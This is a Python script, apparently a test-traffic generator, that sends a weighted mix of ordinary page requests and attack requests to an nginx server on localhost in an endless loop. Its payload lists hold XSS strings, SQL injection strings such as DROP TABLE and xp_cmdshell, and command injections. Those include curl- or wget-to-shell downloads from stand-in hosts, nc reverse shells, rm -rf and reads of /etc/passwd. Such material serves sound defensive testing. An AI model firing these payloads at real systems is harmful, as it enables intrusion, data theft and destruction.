import requests
import random
import string
import time

# Define the target server
NGINX_SERVER_URL = "http://localhost"

# Random string generator for fuzzing
def random_string(length=10):
    """
    Generate a random alphanumeric string of the given length.
    """
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Define request templates with placeholders for randomization
NORMAL_REQUESTS = [
    "/index.html",
    "/about",
    "/contact",
    "/products",
    "/services",
    "/blog",
    "/faq",
    f"/search?q={random_string()}",
    f"/login?user={random_string()}&password={random_string()}",
    f"/api/data?item={random.randint(1, 10000)}",
    "/home",
    f"/profile?user={random_string()}",
    f"/cart?item_id={random.randint(1, 500)}",
    f"/order?order_id={random.randint(1000, 9999)}",
    "/sitemap.xml",
    "/robots.txt",
    f"/newsletter?email={random_string(5)}@example.com",
    "/privacy-policy",
    "/terms-of-service",
    "/user/settings",
    f"/images/{random_string(8)}.jpg",
    f"/css/{random_string(5)}.css",
    f"/js/{random_string(5)}.js",
]

XSS_PAYLOADS = [
    f"/?search=<script>alert('{random_string()}')</script>",
    f"/?search=<img src=x onerror=alert('{random_string()}')>",
    f"/?search=<svg onload=alert('{random_string()}')>",
    f"/?search=<body onload=alert('{random_string()}')>",
    f"/?search=<iframe src=javascript:alert('{random_string()}')>",
    f"/?search=<input type='text' value='{random_string()}' onfocus=alert('{random_string()}')>",
    f"/?search=<link rel='stylesheet' href='javascript:alert({random_string()})'>",
    f"/?search=<meta http-equiv='refresh' content='0;url=javascript:alert({random_string()})'>",
    f"/?search=<table background='javascript:alert({random_string()})'>",
    f"/?search=<div style='width:expression(alert({random_string()}));'></div>",
    f"/?search=<a href='javascript:alert(\"{random_string()}\")'>Click</a>",
    f"/?search=<object data='javascript:alert({random_string()})'></object>",
    f"/?search=<embed src='javascript:alert({random_string()})'></embed>",
    f"/?search=<button onclick='alert({random_string()})'>Click me</button>",
    f"/?search=<form action='javascript:alert({random_string()})'><input type='submit'></form>",
    f"/?search=<img src='x' onerror='alert({random_string()})'>",
    f"/?search=<details open ontoggle=alert({random_string()})>",
    f"/?search=<marquee onstart=alert({random_string()})>",
    f"/?search=<keygen autofocus onfocus=alert({random_string()})>",
    f"/?search=<video><source onerror='javascript:alert({random_string()})'></video>",
]

SQLI_PAYLOADS = [
    f"/?id=1' OR '1'='1",
    f"/?id=1' OR '{random_string()}'='{random_string()}'",
    f"/?id=1'; DROP TABLE users;--",
    f"/?id=1 UNION SELECT username, password FROM users",
    f"/?id=1 UNION ALL SELECT NULL, NULL, NULL, @@version#",
    f"/?id=1' AND SLEEP({random.randint(1,5)}) AND '1'='1",
    f"/?id=1' OR 1=1#",
    f"/?id=1' ORDER BY {random.randint(1,10)}--",
    f"/?id=1' AND (SELECT COUNT(*) FROM users) > 0--",
    f"/?id=1' UNION SELECT NULL, version(), user()--",
    f"/?id=1 AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64",
    f"/?id=1' OR EXISTS(SELECT * FROM users WHERE username='{random_string()}')--",
    f"/?id=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",
    f"/?id=1; EXEC XP_CMDSHELL('dir')",
    f"/?id=1' UNION SELECT NULL, NULL, NULL--",
    f"/?id=1' AND 1=(SELECT COUNT(*) FROM users)--",
    f"/?id=1' AND EXISTS(SELECT * FROM information_schema.tables)--",
    f"/?id=1' UNION SELECT table_name FROM information_schema.tables--",
    f"/?id=1' OR 'a'='a'--",
    f"/?id=1' OR 1=1 LIMIT 1 OFFSET 1--",
]

COMMAND_INJECTION_PAYLOADS = [
    f"/?file=1; cat /etc/passwd",
    f"/?file=1 && ls -la",
    f"/?file=1 || wget http://malicious.com/{random_string()}.sh",
    f"/?file=1 | nc {random_string()}.com 4444 -e /bin/bash",
    f"/?file=1 `rm -rf /{random_string()}`",
    f"/?file=$(rm -rf /{random_string()})",
    f"/?file=1; shutdown -h now",
    f"/?file=1; curl http://{random_string()}.com/shell.sh | sh",
    f"/?file=1 & ping -c 4 {random_string()}.com",
    f"/?file=1; php -r 'system(\"cat /etc/passwd\");'",
    f"/?file=1; perl -e 'exec \"/bin/sh\";'",
    f"/?file=1; python -c 'import os; os.system(\"/bin/sh\")'",
    f"/?file=1; nc -e /bin/sh {random_string()}.com 4444",
    f"/?file=1; rm -rf ~/.*",
    f"/?file=1; echo 'malicious code' > /tmp/{random_string()}",
    f"/?file=1; touch /tmp/{random_string()}",
    f"/?file=1; chmod 777 /etc/passwd",
    f"/?file=1; export PATH=/malicious/path",
    f"/?file=1; cp /bin/sh /tmp/sh; /tmp/sh",
    f"/?file=1; kill -9 1",
]

# Function to generate random request
def generate_random_request():
    # Define weighted probabilities for each request type
    request_types = ["normal", "xss", "sqli", "command_injection"]
    probabilities = [0.8, 0.07, 0.08, 0.05]  # Adjust these probabilities as needed

    request_type = random.choices(request_types, probabilities)[0]

    if request_type == "normal":
        payload = random.choice(NORMAL_REQUESTS)
    elif request_type == "xss":
        payload = random.choice(XSS_PAYLOADS)
    elif request_type == "sqli":
        payload = random.choice(SQLI_PAYLOADS)
    elif request_type == "command_injection":
        payload = random.choice(COMMAND_INJECTION_PAYLOADS)
    else:
        payload = "/"
        request_type = "normal"
    return payload, request_type

# Function to send requests
def send_request(url, payload, request_type):
    full_url = f"{url}{payload}"
    try:
        print(f"Sending {request_type} request: {full_url}")
        response = requests.get(full_url, timeout=5)
        print(f"Response status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send request: {e}")

# Main loop to send requests with fluctuating frequency
def main():
    while True:
        payload, request_type = generate_random_request()
        send_request(NGINX_SERVER_URL, payload, request_type)
        # Randomize the interval to create fluctuating access frequency
        sleep_time = random.uniform(0, random.uniform(0, 2))
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()

